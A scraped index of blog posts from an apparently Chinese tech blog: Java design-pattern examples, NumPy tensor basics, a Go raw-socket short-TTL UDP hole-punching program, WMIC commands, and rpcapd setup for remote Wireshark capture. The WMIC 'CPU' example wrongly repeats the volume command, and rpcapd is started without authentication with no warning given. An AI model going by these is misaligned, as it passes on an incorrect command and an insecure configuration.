将对象间的一对多关联转变为一对一的关联，提高系统的灵活性，使得系统易于维护和扩展。 缺点：\n中介者模式将原本多个对象直接的相互依赖变成了中介者和多个同事类的依赖关系。当同事类越多时，中介者就会越臃肿，变得复杂且难以维护。 3. 结构 抽象中介者（Mediator）角色：它是中介者的接口，提供了同事对象注册与转发同事对象信息的抽象方法； 具体中介者（Concrete Mediator）角色：实现中介者接口，定义一个 List 来管理同事对象，协调各个同事角色之间的交互关系，因此它依赖于同事角色； 抽象同事类（Colleague）角色：定义同事类的接口，保存中介者对象，提供同事对象交互的抽象方法，实现所有相互影响的同事类的公共功能； 具体同事类（Concrete Colleague）角色：是抽象同事类的实现者，当需要与其他同事对象交互时，由中介者对象负责后续的交互。 二、代码实现 抽象同事类 定义同事类的接口，保存中介者对象，提供同事对象交互的抽象方法，实现所有相互影响的同事类的公共功能：\n1 2 3 4 5 6 7 8 9 10 11 12 package pers.designPattern.mediator; public abstract class Colleague { protected Mediator mediator; public void setMediator(Mediator mediator) { this.mediator = mediator; } public abstract void receive(); public abstract void send(); } 具体同事类 是抽象同事类的实现者，当需要与其他同事对象交互时，由中介者对象负责后续的交互：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package pers.designPattern.mediator; public class ConcreteColleague1 extends Colleague { @Override public void receive() { System.out.println(\u0026#34;具体同事1收到请求...\u0026#34;); } @Override public void send() { System.out.println(\u0026#34;同事1发出请求...\u0026#34;); mediator.relay(this); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package pers.designPattern.mediator; public class ConcreteColleague2 extends Colleague { @Override public void receive() { System.out.println(\u0026#34;具体同事2收到请求...\u0026#34;); } @Override public void send() { System.out.println(\u0026#34;同事2发出请求...\u0026#34;); mediator.relay(this); } } 抽象中介者 它是中介者的接口，提供了同事对象注册与转发同事对象信息的抽象方法：\n1 2 3 4 5 6 package pers.designPattern.mediator; public abstract class Mediator { public abstract void register(Colleague colleague); public abstract void relay(Colleague colleague); } 具体中介者 实现中介者接口，定义一个 List 来管理同事对象，协调各个同事角色之间的交互关系，因此它依赖于同事角色：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package pers.designPattern.mediator; import java.util.ArrayList; import java.util.List; public class ConcreteMediator extends Mediator { private List\u0026lt;Colleague\u0026gt; colleagues = new ArrayList\u0026lt;\u0026gt;(); @Override public void register(Colleague colleague) { if (!colleagues.contains(colleague)) { colleagues.add(colleague); colleague.setMediator(this); } } @Override public void relay(Colleague colleague) { for (Colleague obj: colleagues) { if (!obj.equals(colleague)) { obj.receive(); } } } } 客户类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package pers.designPattern.mediator; public class MediatorClient { public static void main(String[] args) { Mediator mediator = new ConcreteMediator(); Colleague c1, c2; c1 = new ConcreteColleague1(); c2 = new ConcreteColleague2(); mediator.register(c1); mediator.register(c2); c1.send(); c2.send(); } } 运行结果：\n同事1发出请求... 具体同事2收到请求... 同事2发出请求... 具体同事1收到请求... 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F/","title":"设计模式——中介者模式"},{"content":"设计模式——装饰器模式 一、基本概念 1. 定义 修饰模式，是面向对象编程领域中，一种动态地往一个类中添加新的行为的设计模式。就功能而言，修饰模式相比生成子类更为灵活，这样可以给某个对象而不是整个类添加一些功能。\n2. 优缺点 优点：\n是继承的有力补充，比继承灵活，在不改变原有对象的情况下，动态的给一个对象扩展功能，即插即用； 通过使用不用装饰类及这些装饰类的排列组合，可以实现不同效果； 装饰器模式完全遵守开闭原则。 缺点：\n装饰器模式会增加许多子类，过度使用会增加程序得复杂性。 3. 结构 抽象构件（Component）角色：定义一个抽象接口以规范准备接收附加责任的对象； 具体构件（ConcreteComponent）角色：实现抽象构件，通过装饰角色为其添加一些职责； 抽象装饰（Decorator）角色：继承抽象构件，并包含具体构件的实例，可以通过其子类扩展具体构件的功能； 具体装饰（ConcreteDecorator）角色：实现抽象装饰的相关方法，并给具体构件对象添加附加的责任。 二、代码实现 抽象构件角色 1 2 3 interface Component { public void operation(); } 具体构件角色 1 2 3 4 5 6 7 8 9 10 11 12 package pers.designPattern.decorator; public class ConcreteComponent implements Component { public ConcreteComponent (){ System.out.println(\u0026#34;创建具体的构建角色...\u0026#34;); } @Override public void operation() { System.out.println(\u0026#34;原有功能！\u0026#34;); } } 抽象装饰角色 1 2 3 4 5 6 7 8 9 10 11 12 class Decorator implements Component { private Component component; public Decorator(Component component) { this.component = component; } @Override public void operation() { component.operation(); } } 具体装饰角色 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class ConcreteDecorator extends Decorator { public ConcreteDecorator(Component component) { super(component); } @Override public void operation() { super.operation(); addFunction(); } public void addFunction() { System.out.println(\u0026#34;额外功能！\u0026#34;); } } 客户类 1 2 3 4 5 6 7 8 9 10 11 package pers.designPattern.decorator; public class DecoratorClient { public static void main(String[] args) { Component component = new ConcreteComponent(); component.operation(); System.out.println(\u0026#34;--------------\u0026#34;); Component component1 = new ConcreteDecorator(component); component1.operation(); } } 运行结果：\n创建具体的构建角色... 原有功能！ -------------- 原有功能！ 额外功能！ 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"设计模式——装饰器模式"},{"content":"设计模式——状态模式 一、基本概念 1. 定义 状态（State）模式：对有状态的对象，把复杂的“判断逻辑”提取到不同的状态对象中，允许状态对象在其内部状态发生改变时改变其行为。\n状态模式是一种行为设计模式， 让你能在一个对象的内部状态变化时改变其行为， 使其看上去就像改变了自身所属的类一样。\n2. 优缺点 优点：\n结构清晰，状态模式将与特定状态相关的行为局部化到一个状态中，并且将不同状态的行为分割开来，满足“单一职责原则”； 将状态转换显示化，减少对象间的相互依赖。将不同的状态引入独立的对象中会使得状态转换变得更加明确，且减少对象间的相互依赖； 状态类职责明确，有利于程序的扩展。通过定义新的子类很容易地增加新的状态和转换。 缺点：\n状态模式的使用必然会增加系统的类与对象的个数； 状态模式的结构与实现都较为复杂，如果使用不当会导致程序结构和代码的混乱； 状态模式对开闭原则的支持并不太好，对于可以切换状态的状态模式，增加新的状态类需要修改那些负责状态转换的源码，否则无法切换到新增状态，而且修改某个状态类的行为也需要修改对应类的源码。 3. 结构 环境类（Context）角色：也称为上下文，它定义了客户端需要的接口，内部维护一个当前状态，并负责具体状态的切换； 抽象状态（State）角色：定义一个接口，用以封装环境对象中的特定状态所对应的行为，可以有一个或多个行为； 具体状态（Concrete State）角色：实现抽象状态所对应的行为，并且在需要的情况下进行状态切换。 二、代码实现 环境类 它定义了客户端需要的接口，内部维护一个当前状态，并负责具体状态的切换：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package pers.designPattern.state; public class Context { private State state; public Context() { state = new ConcreteStateA(); } public void setState(State state) { this.state = state; } public State getState() { return state; } public void Handle() { state.Handle(this); } } 抽象状态角色 定义一个接口，用以封装环境对象中的特定状态所对应的行为，可以有一个或多个行为：\n1 2 3 4 5 package pers.designPattern.state; public abstract class State { public abstract void Handle(Context context); } 具体状态角色 实现抽象状态所对应的行为，并且在需要的情况下进行状态切换：\n1 2 3 4 5 6 7 8 9 package pers.designPattern.state; public class ConcreteStateA extends State { @Override public void Handle(Context context) { System.out.println(\u0026#34;当前为状态 A\u0026#34;); context.setState(new ConcreteStateB()); } } 1 2 3 4 5 6 7 8 9 package pers.designPattern.state; public class ConcreteStateB extends State { @Override public void Handle(Context context) { System.out.println(\u0026#34;当前为状态 B\u0026#34;); context.setState(new ConcreteStateA()); } } 客户类 1 2 3 4 5 6 7 8 9 10 11 package pers.designPattern.state; public class StateClient { public static void main(String[] args) { Context context = new Context(); context.Handle(); context.Handle(); context.Handle(); context.Handle(); } } 运行结果：\n当前为状态 A 当前为状态 B 当前为状态 A 当前为状态 B 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F/","title":"设计模式——状态模式"},{"content":"设计模式——组合模式 一、基本概念 1. 定义 组合（Composite Pattern）模式的定义：有时又叫作整体-部分（Part-Whole）模式，它是一种将对象组合成树状的层次结构的模式，用来表示“整体-部分”的关系，使用户对单个对象和组合对象具有一致的访问性，属于结构型设计模式。\n2. 优缺点 优点：\n组合模式使得客户端代码可以一致地处理单个对象和组合对象，无须关心自己处理的是单个对象，还是组合对象，这简化了客户端代码； 更容易在组合体内加入新的对象，客户端不会因为加入了新的对象而更改源代码，满足“开闭原则”； 缺点：\n设计较复杂，客户端需要花更多时间理清类之间的层次关系； 不容易限制容器中的构件； 不容易用继承的方法来增加构件的新功能； 3. 结构 抽象构件（Component）角色：它的主要作用是为树叶构件和树枝构件声明公共接口，并实现它们的默认行为。在透明式的组合模式中抽象构件还声明访问和管理子类的接口；在安全式的组合模式中不声明访问和管理子类的接口，管理工作由树枝构件完成。（总的抽象类或接口，定义一些通用的方法，比如新增、删除） 树叶构件（Leaf）角色：是组合中的叶节点对象，它没有子节点，用于继承或实现抽象构件。 树枝构件（Composite）角色 / 中间构件：是组合中的分支节点对象，它有子节点，用于继承和实现抽象构件。它的主要作用是存储和管理子部件，通常包含 Add()、Remove()、GetChild() 等方法。 二、代码实现 UML 抽象结构角色 通用接口：\n1 2 3 4 5 6 package pers.designPattern.composite; public interface Component { public float calculation(); public void show(); } 树叶构建角色 商品类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package pers.designPattern.composite; public class Goods implements Component { private String name; private int quantity; private float price; public Goods(String name, int quantity, float price) { this.name = name; this.quantity = quantity; this.price = price; } @Override public float calculation() { return quantity * price; } @Override public void show() { System.out.println(name + \u0026#34;：\u0026#34; + \u0026#34;（数量：\u0026#34; + quantity + \u0026#34;个；单价：\u0026#34; + price + \u0026#34;元）\u0026#34;); } } 具体建造者 口袋类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package pers.designPattern.composite; import java.util.ArrayList; public class Pocket implements Component { private String name; private ArrayList\u0026lt;Component\u0026gt; pocket = new ArrayList\u0026lt;\u0026gt;(); public Pocket(String name) { this.name = name; } public void add(Component component) { pocket.add(component); } public void remove(Component component) { pocket.remove(component); } public Component getChild(int i) { return pocket.get(i); } @Override public float calculation() { float sum = 0; for (Component component: pocket) { sum += component.calculation(); } return sum; } @Override public void show() { for (Component component: pocket) { component.show(); } } } 客户类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package pers.designPattern.composite; public class Composite { public static void main(String[] args) { Pocket small, medium, large; small = new Pocket(\u0026#34;小号袋子\u0026#34;); medium = new Pocket(\u0026#34;中号袋子\u0026#34;); large = new Pocket(\u0026#34;大号袋子\u0026#34;); small.add(new Goods(\u0026#34;苹果\u0026#34;, 5, 1.3f)); small.add(new Goods(\u0026#34;香蕉\u0026#34;, 8, 1.5f)); medium.add(small); medium.add(new Goods(\u0026#34;牛奶\u0026#34;, 3, 4.1f)); large.add(medium); large.show(); System.out.println(\u0026#34;总价：\u0026#34; + large.calculation() + \u0026#34;元\u0026#34;); } } 运行结果：\n苹果：（数量：5个；单价：1.3元） 香蕉：（数量：8个；单价：1.5元） 牛奶：（数量：3个；单价：4.1元） 总价：30.8元 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/","title":"设计模式——组合模式"},{"content":"神经网络中的数据表示 引言 当前所有机器学习系统都使用张量作为基本数据结构。张量对这个领域非常重要，重要到 Google 的 TensorFlow 都是以它来命名的。那么什么是张量？\n1. 标量（0D张量） 标量（英语：scalar），又称纯量，是只有大小、没有方向、可用实数表示的一个量。实际上标量就是实数，“标量”这个称法只是为了区别于向量。标量可以是负数，例如温度低于冰点。与之相对，向量（又称矢量）既有大小，又有方向。与此相对的矢量，其分量在不同的坐标系中有不同的值，例如速度。标量可被用作定义向量空间。\n——维基百科\n仅包含一个数字的张量叫作标量（scalar，也叫标量张量、零维张量、0D张量）。在Numpy中，一个 float32 或 float64 的数字就是一个标量张量（或标量数组）。标量张量有0个轴（ndim == 0）。张量轴的个数也叫作阶（rank）。\n下面是一个 Numpy 标量：\n1 2 3 4 5 6 \u0026gt;\u0026gt;\u0026gt; import numpy as np \u0026gt;\u0026gt;\u0026gt; x = np.array(9) \u0026gt;\u0026gt;\u0026gt; x array(9) \u0026gt;\u0026gt;\u0026gt; x.ndim 0 2. 向量（1D张量） 向量 （英语：euclidean vector，物理、工程等也称作矢量 、欧几里得向量）是数学、物理学和工程科学等多个自然科学中的基本概念。指一个同时具有大小和方向，且满足平行四边形法则的几何对象。理论数学中向量的定义为任何在向量空间中的元素。\n数字组成的数组叫作向量（vector）或一维张量（1D张量）。一维张量只有一个轴。\n下面是一个Numpy向量：\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; y = np.array([12, 5, 4, 11, 9]) \u0026gt;\u0026gt;\u0026gt; y array([12, 5, 4, 11, 9]) \u0026gt;\u0026gt;\u0026gt; y.ndim 1 上面代码中所写向量有5个元素，所以被称为 5D向量。不要把 5D向量 和 5D张量 弄混！\n5D向量只有一个轴，沿着轴有5个维度；而5D张量有5个轴（沿着每个轴可能有任意个维度）。\n维度（dimensionality）可以表示沿着某个轴上的元素个数（比如5D向量）；\n阶数（order）可以表示张量轴的个数。\n3. 矩阵（2D张量） 数学上，一个 m * n 的矩阵是一个由 m 行（row) n 列（column)元素排列成的矩形阵列。矩阵里的元素可以是数字、符号或数学式。以下是一个由6个数字元素构成的2行3列的矩阵：\n——维基百科\n向量组成的数组叫作矩阵（matrix）或二维张量（2D张量），矩阵有2个轴（通常叫作行和列）。\n我们可以将矩阵直观地理解为数字组成的矩形网格。\n下面是一个Numpy矩阵：\n1 2 3 4 5 6 7 8 9 \u0026gt;\u0026gt;\u0026gt; z = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]) \u0026gt;\u0026gt;\u0026gt; z array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]) \u0026gt;\u0026gt;\u0026gt; z.ndim 2 矩阵上第一个轴上的元素叫作行（row），第二个轴上的元素叫作列（column）。\n在上面的例子中，[1, 2, 3] 是x的第一行，[1, 4, 7]是第一列。\n4. 3D张量与高阶张量 将多个矩阵组合成一个新的数组，就可以得到一个3D张量，我们可以理解为由数字组成的立方体。\n下面是一个Numpy的3D张量：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026gt;\u0026gt;\u0026gt; s = np.array([[[1, 2, 3], [4, 5, 6], [7, 8, 9]], [[1, 2, 3], [4, 5, 6], [7, 8, 9]], [[1, 2, 3], [4, 5, 6], [7, 8, 9]]]) \u0026gt;\u0026gt;\u0026gt; s array([[[1, 2, 3], [4, 5, 6], [7, 8, 9]], [[1, 2, 3], [4, 5, 6], [7, 8, 9]], [[1, 2, 3], [4, 5, 6], [7, 8, 9]]]) \u0026gt;\u0026gt;\u0026gt; s.ndim 3 以此类推，4D张量便由3D张量堆叠而成，5D张量由4D张量堆叠而成\u0026hellip;\u0026hellip;\n5. 张量的关键属性 张量是由以下三个关键属性来定义的。\n轴的个数（阶），例如，3D张量有3个轴，矩阵有2个轴。在Numpy等Python库中也叫张量的ndim。 **形状：**形状是一个整数元组，它表示张量沿每个轴的维度大小（元素个数）。前面的示例中，矩阵的形状为(3, 3)，3D张量的形状为(3，3，3)，向量的形状为(5, )，而标量的形状为空，即()。 数据类型（在Python库中通常叫作dtype）：这是张量中所包含数据的类型，例如，张量的类型可以是float32、uint8、float64等。在极少数情况下，你可能会遇到字符（char）张量。注意，Numpy（以及大多数其他库）中不存在字符串张量，因为张量存储在预先分配的连续内存段中，而字符串的长度是可变的，无法用这种方式存储。 6. 现实世界的常用张量 **向量数据：**2D张量，形状为(samples, features) **时间序列数据或序列数据：**3D张量，形状为(samples, timesteps,features) **图像：**4D张量，形状为(samples, height, width, channels)或(samples, channels, height, width) **视频：**5D张量，形状为(samples, frames, height, width, channels)或(samples, frames, channels, height, width) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/","title":"神经网络中的数据表示"},{"content":"实现自定义 TTL UDP 包发送 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 package main import ( \u0026#34;errors\u0026#34; // 用于返回和处理错误 \u0026#34;fmt\u0026#34; // 用于格式化输出 \u0026#34;log\u0026#34; // 用于日志记录 \u0026#34;net/netip\u0026#34; // 提供IP地址和端口解析功能 \u0026#34;syscall\u0026#34; // 用于系统调用 \u0026#34;time\u0026#34; // 用于时间相关的操作 \u0026#34;github.com/google/gopacket\u0026#34; // 用于网络数据包处理 \u0026#34;github.com/google/gopacket/layers\u0026#34; // 提供网络层协议封装 \u0026#34;github.com/libp2p/go-netroute\u0026#34; // 用于路由信息获取 \u0026#34;golang.org/x/sys/unix\u0026#34; // 提供Unix系统调用 ) const ( // 最小TTL值，用于短TTL穿透 MinShortTTL = 3 // 最大TTL值，用于短TTL穿透 MaxShortTTL = 10 // 每次尝试发送的包数量 PunchPacketCount = 5 // 每次发送包之间的时间间隔 PunchInterval = 5 * time.Millisecond // 源端口号 SrcPort = 13131 ) func main() { // 调用shortTTL函数进行短TTL穿透尝试 err := shortTTL(netip.MustParseAddrPort(\u0026#34;111.9.57.80:3439\u0026#34;)) if err != nil { // 如果有错误，终止程序执行 panic(err) } } func shortTTL(dst netip.AddrPort) error { log.Printf(\u0026#34;attempting short TTL hole punch to %s\u0026#34;, dst) // 检查目标地址是否为IPv4 isIPv4 := dst.Addr().Is4() // 创建一个新的路由查找器 r, err := netroute.New() if err != nil { log.Printf(\u0026#34;fail to create netroute: %v\u0026#34;, err) } if r == nil { return errors.New(\u0026#34;not support use shortTTL\u0026#34;) } // 获取路由信息 _, _, src, err := r.Route(dst.Addr().AsSlice()) if err != nil { return fmt.Errorf(\u0026#34;route lookup failed: %w\u0026#34;, err) } var ( // 套接字文件描述符 sockFd int // 网络层（IP层） ip gopacket.NetworkLayer // 目的地址的套接字地址结构 dstSock syscall.Sockaddr ) // 根据地址类型（IPv4或IPv6）进行不同的处理 if isIPv4 { // 创建IPv4原始套接字 sockFd, err = syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW) if err != nil { return fmt.Errorf(\u0026#34;socket creation failed: %w\u0026#34;, err) } // 确保套接字在函数结束时被关闭 defer syscall.Close(sockFd) // 设置IP头包含选项，以便我们可以自己构建IP头 if err := syscall.SetsockoptInt(sockFd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil { return fmt.Errorf(\u0026#34;failed to set IP_HDRINCL: %w\u0026#34;, err) } // 构造IPv4报文 ip = \u0026amp;layers.IPv4{ Version: 4, IHL: 5, // 头长度 SrcIP: src, DstIP: dst.Addr().AsSlice(), Protocol: layers.IPProtocolUDP, } dstSock = \u0026amp;syscall.SockaddrInet4{ Port: 0, Addr: dst.Addr().Unmap().As4(), } } else { // 创建IPv6原始套接字 sockFd, err = syscall.Socket(syscall.AF_INET6, syscall.SOCK_RAW, syscall.IPPROTO_RAW) if err != nil { return fmt.Errorf(\u0026#34;IPv6 socket creation failed: %w\u0026#34;, err) } defer syscall.Close(sockFd) // 设置IPv6头包含选项 if err := syscall.SetsockoptInt(sockFd, syscall.IPPROTO_IPV6, unix.IPV6_HDRINCL, 1); err != nil { return fmt.Errorf(\u0026#34;failed to set IPV6_HDRINCL: %w\u0026#34;, err) } // 构造IPv6报文 ip = \u0026amp;layers.IPv6{ Version: 6, SrcIP: src, DstIP: dst.Addr().AsSlice(), NextHeader: layers.IPProtocolUDP, } dstSock = \u0026amp;syscall.SockaddrInet6{ Port: 0, Addr: dst.Addr().Unmap().As16(), } } // 构造UDP层 udp := \u0026amp;layers.UDP{ SrcPort: SrcPort, DstPort: layers.UDPPort(dst.Port()), } // 设置序列化选项 opts := gopacket.SerializeOptions{ ComputeChecksums: true, // 自动计算校验和 FixLengths: true, // 自动修复长度字段 } // 尝试不同TTL/Hop Limit值进行穿透 for i := MinShortTTL; i \u0026lt;= MaxShortTTL; i++ { if isIPv4 { // 设置IPv4的TTL ip.(*layers.IPv4).TTL = uint8(i) } else { // 设置IPv6的Hop Limit ip.(*layers.IPv6).HopLimit = uint8(i) } // 为UDP层设置网络层信息，以便计算校验和 udp.SetNetworkLayerForChecksum(ip) // 创建序列化缓冲区 buf := gopacket.NewSerializeBuffer() // 序列化报文层 err = gopacket.SerializeLayers(buf, opts, ip.(gopacket.SerializableLayer), udp, gopacket.Payload(\u0026#34;short ttl pack\u0026#34;)) if err != nil { return fmt.Errorf(\u0026#34;packet serialization failed: %w\u0026#34;, err) } // 获取序列化后的报文数据 packetData := buf.Bytes() // 发送多个包以增加穿透成功的概率 for i := 0; i \u0026lt; PunchPacketCount; i++ { err = syscall.Sendto(sockFd, packetData, 0, dstSock) if err != nil { return fmt.Errorf(\u0026#34;failed to send packet %d/%d: %w\u0026#34;, i+1, PunchPacketCount, err) } // 在发送下一个包之前等待一段时间 if i \u0026lt; PunchPacketCount-1 { time.Sleep(PunchInterval) } } log.Printf(\u0026#34;successfully sent a short ttl(%d) packet to %s\u0026#34;, i, dst) } // 报告成功发送短TTL包 log.Printf(\u0026#34;successfully sent a short ttl packet to %s\u0026#34;, dst) return nil } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%AE%9A%E4%B9%89-ttl-udp-%E5%8C%85%E5%8F%91%E9%80%81/","title":"实现自定义 TTL UDP 包发送"},{"content":"使用 WMIC 获取系统信息 WMI（Windows Management Instrumentation，Windows管理工具）是 Windows 提供的一组管理接口，用户可以使用 WMI 管理本地和远程计算机。\n打开 Windows Terminal 输入 wmic /? 可以查看 wmic 的用法。\n下面是一些通过 wmic 获取系统信息的例子：\n获取磁盘信息：\n1 wmic diskdrive get /format:list 获取主板信息：\n1 wmic baseboard get /format:list 获取计算机系统管理信息：\n1 wmic computersystem get /format:list 获取系统卷信息：\n1 wmic volume get /format:list 获取 CPU 信息：\n1 wmic volume get /format:list 获取内存信息：\n1 wmic memorychip get /format:list 获取已安装系统信息：\n1 wmic os get /format:list 获取进程管理信息：\n1 wmic process get /format:list 获取 BIOS 信息：\n1 wmic bios get /format:list ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%BD%BF%E7%94%A8-wmic-%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/","title":"使用 WMIC 获取系统信息"},{"content":"当我们在使用ls命令列出文件夹下内容时，我们会发现有一个total行，在total后面还有一个数字。\n1 2 3 4 5 6 7 8 9 10 11 12 13 [GNU@ecs-x ~]$ ls -li total 44 926532 drwxr-xr-x 2 GNU GNU 4096 Feb 25 09:56 Desktop 926536 drwxr-xr-x 2 GNU GNU 4096 Feb 23 19:10 Documents 926533 drwxr-xr-x 2 GNU GNU 4096 Feb 23 19:10 Downloads 926537 drwxr-xr-x 2 GNU GNU 4096 Feb 23 19:10 Music 926538 drwxr-xr-x 2 GNU GNU 4096 Feb 23 19:10 Pictures 926535 drwxr-xr-x 2 GNU GNU 4096 Feb 23 19:10 Public 926534 drwxr-xr-x 2 GNU GNU 4096 Feb 23 19:10 Templates 925774 -rw-rw-r-- 1 GNU GNU 127 Feb 26 18:09 test.py 925571 -rw-rw-r-- 1 GNU GNU 7 Feb 25 17:41 test.txt 926479 drwxr-xr-t 2 GNU GNU 4096 Feb 23 19:10 thinclient_drives 926539 drwxr-xr-x 2 GNU GNU 4096 Feb 23 19:10 Videos 那么这个total代表的是什么呢？ 事实上这个total后的数字是代表着该目录下的所有项目占据的总内存空间。在ls命令后面加上 -h 可以更清楚的看到这个效果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 [GNU@ecs-x ~]$ ls -lih total 44K 926532 drwxr-xr-x 2 GNU GNU 4.0K Feb 25 09:56 Desktop 926536 drwxr-xr-x 2 GNU GNU 4.0K Feb 23 19:10 Documents 926533 drwxr-xr-x 2 GNU GNU 4.0K Feb 23 19:10 Downloads 926537 drwxr-xr-x 2 GNU GNU 4.0K Feb 23 19:10 Music 926538 drwxr-xr-x 2 GNU GNU 4.0K Feb 23 19:10 Pictures 926535 drwxr-xr-x 2 GNU GNU 4.0K Feb 23 19:10 Public 926534 drwxr-xr-x 2 GNU GNU 4.0K Feb 23 19:10 Templates 925774 -rw-rw-r-- 1 GNU GNU 127 Feb 26 18:09 test.py 925571 -rw-rw-r-- 1 GNU GNU 7 Feb 25 17:41 test.txt 926479 drwxr-xr-t 2 GNU GNU 4.0K Feb 23 19:10 thinclient_drives 926539 drwxr-xr-x 2 GNU GNU 4.0K Feb 23 19:10 Videos ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%BD%BF%E7%94%A8ls%E5%91%BD%E4%BB%A4%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84total/","title":"使用ls命令时出现的total"},{"content":"Wireshark 远程抓包 Wireshark 支持使用远程接口抓包，想要使用这个能力需要使用 libpcap 提供远程抓包服务。\n自行编译运行 libpcap libpcap 源码可以从 tcpdump 官网 下载：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 下载 libpcap wget https://www.tcpdump.org/release/libpcap-1.10.4.tar.xz # 安装依赖程序 apt install gcc flex bison make # 配置 libpcap, 启用远程抓包能力 ./configure --enable-remote # 编译程序 make # 运行 rpcapd, 监听 ipv4 地址, 无密码认证 ./rpcapd/rpcapd -4 -n Wireshark 添加远程接口 输入远程主机地址，即可拿到所有网卡：\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%BD%BF%E7%94%A8rpcapdlibpcap%E8%BF%9B%E8%A1%8Cwireshark%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8C%85/","title":"使用rpcapd（libpcap）进行Wireshark远程抓包"},{"content":"使用 UDP 实现 p2p 建立 UDP 的核心是向对端不同的 UDP 地址发送请求，在 Go 中可使用下面的代码实现功能：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package main import ( \u0026#34;net\u0026#34; ) func main() { packet, err := net.ListenPacket(\u0026#34;udp\u0026#34;, \u0026#34;\u0026#34;) if err != nil { panic(err) } peerAddress := []*net.UDPAddr{} for _, address := range peerAddress { packet.WriteTo([]byte(\u0026#34;attempt\u0026#34;), address) } } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%BD%BF%E7%94%A8udp%E5%AE%9E%E7%8E%B0-p2p/","title":"使用UDP实现 p2p"},{"content":"如果双端时间不一致，可能会引发加密信道协商出问题。\n主机端可能由于电池失效，导致时钟出错。在未联网状态下，无法获取准确时间。 手机端手动设置一个错误时间的概率比较低。 底层信道不支持加密时 如果在底层信道不支持加密，libp2p 提供了tls和noise两种加密。目前版本的默认值是先tls，后noise。\nNoise 与时间无关 TLS 和时间有关，libp2p在生成证书时，证书有效期为一小时前到一百年后。https://github.com/libp2p/go-libp2p/blob/master/p2p/security/tls/crypto.go libp2p校验证书使用\u0026quot;crypto/x509\u0026quot;，该库校验证书时会比对证书有效期。可以设置当前时间，但未提供忽略。 当某一端的时间错误地设置成未来，另一端就会报错。 底层信道支持加密时 如果在底层信道支持加密，libp2p直接使用信道提供的加密。\nQUIC 未测试是否受时间影响\nWebRTC 未测试是否受时间影响\nWebTransport 未测试是否受时间影响\n方案 方案A【暂定？】 初始化时手动指定优先使用noise。\n1 2 3 4 5 6 7 8 9 10 11 import ( \u0026#34;github.com/libp2p/go-libp2p/p2p/security/noise\u0026#34; tls \u0026#34;github.com/libp2p/go-libp2p/p2p/security/tls\u0026#34; // ... ) libp2p.New( libp2p.Security(noise.ID, noise.New), libp2p.Security(tls.ID, tls.New), // ... ) 方案B【暂定？】 